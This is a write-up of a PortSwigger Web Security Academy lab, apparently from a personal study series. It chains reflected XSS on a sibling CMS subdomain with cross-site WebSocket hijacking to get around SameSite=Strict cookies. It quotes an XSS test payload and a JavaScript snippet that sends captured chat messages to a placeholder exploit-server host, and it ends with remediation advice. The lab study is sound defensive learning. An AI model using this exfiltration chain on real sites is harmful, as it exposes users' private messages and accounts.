SameSite Strict Bypass via Sibling Domain

Platform: PortSwigger Web Security Academy
Difficulty: Practitioner
Category: CSRF / SameSite Bypass / XSS / WebSocket
Tools: Burp Suite Community Edition, JavaScript, Exploit Server
Status: ✅ Solved
Challenge: 30 Days of Web Security — Day 03

1. Objective

Exploit a vulnerability on a sibling domain to bypass SameSite=Strict cookie restrictions, hijack an authenticated WebSocket connection, and retrieve the victim's chat history.

2. Attack Scenario

The target application uses a session cookie with SameSite=Strict.

A direct cross-site attack cannot normally include this cookie.

However, the application has a vulnerable CMS hosted on a sibling subdomain.

Although the CMS and the main application have different origins, they belong to the same site.

An attacker can exploit XSS on the CMS to initiate an authenticated WebSocket connection to the main application.

3. Reconnaissance

I investigated the application's Live Chat functionality using Burp Suite.

In Proxy → WebSockets history, I observed that the client sends:

READY

The server then returns the user's chat history.

I also discovered a CMS subdomain through the following HTTP response header:

Access-Control-Allow-Origin: https://cms-<LAB-HOST>
4. Finding the XSS Vulnerability

The CMS login form reflected the submitted username in an error message.

I tested the following payload:

<script>alert(1)</script>

Result: The JavaScript executed successfully.

I then converted the login request from POST to GET and confirmed that the XSS also worked through a crafted URL.

This made it possible to deliver the payload through a link.

5. Exploitation

I used the reflected XSS to execute JavaScript from the CMS subdomain.

The script established a WebSocket connection to the main application's chat endpoint and sent the READY message.

Attack chain:

Victim opens malicious link
        ↓
Reflected XSS executes on CMS
        ↓
JavaScript opens WebSocket to main application
        ↓
Browser includes the session cookie
        ↓
Server returns victim's chat history
        ↓
Chat messages are sent to Exploit Server
        ↓
Attacker retrieves lab credentials

Because both application subdomains belong to the same site, SameSite=Strict does not prevent the browser from including the session cookie in this WebSocket handshake.

Using Burp Community Edition

Instead of Burp Collaborator, I used the PortSwigger Exploit Server Access log.

The XSS payload transmitted WebSocket messages through HTTP requests:

ws.onmessage = function(event) {
    const img = new Image();

    img.src = "https://<EXPLOIT-SERVER>/log?msg=" +
              encodeURIComponent(event.data);
};

The requests appeared in the Access log, allowing me to inspect the URL-encoded chat messages.

6. Result

I delivered the exploit to the simulated victim.

The victim's chat history was captured in the Exploit Server Access log.

After decoding the messages, I found the lab credentials and used them to access the victim's account.

Result: ✅ Lab Solved

7. Root Cause and Impact

The attack combined two weaknesses:

Reflected XSS on a sibling CMS subdomain.
Insufficient WebSocket origin validation on the main application.

The sibling-domain relationship allowed the attacker-controlled JavaScript to initiate a same-site request despite the SameSite=Strict cookie setting.

Impact: Exposure of private chat messages and account compromise in the laboratory environment.

8. Remediation
Prevent XSS through context-aware output encoding and safe handling of user input.
Validate the Origin header during WebSocket handshakes.
Implement appropriate authentication and authorization checks for WebSocket operations.
Avoid relying on SameSite cookies as the only CSRF protection.
Treat security vulnerabilities on sibling subdomains as potential risks to the entire site.
9. Key Takeaways

This lab demonstrated that same-site and same-origin are different security concepts.

A vulnerability on one subdomain can affect another subdomain, even when the target uses SameSite=Strict.

I also learned how to inspect WebSocket traffic and use the Exploit Server Access log as an alternative to Burp Collaborator.

Environment: PortSwigger Web Security Academy
Scope: Authorized educational laboratory only.
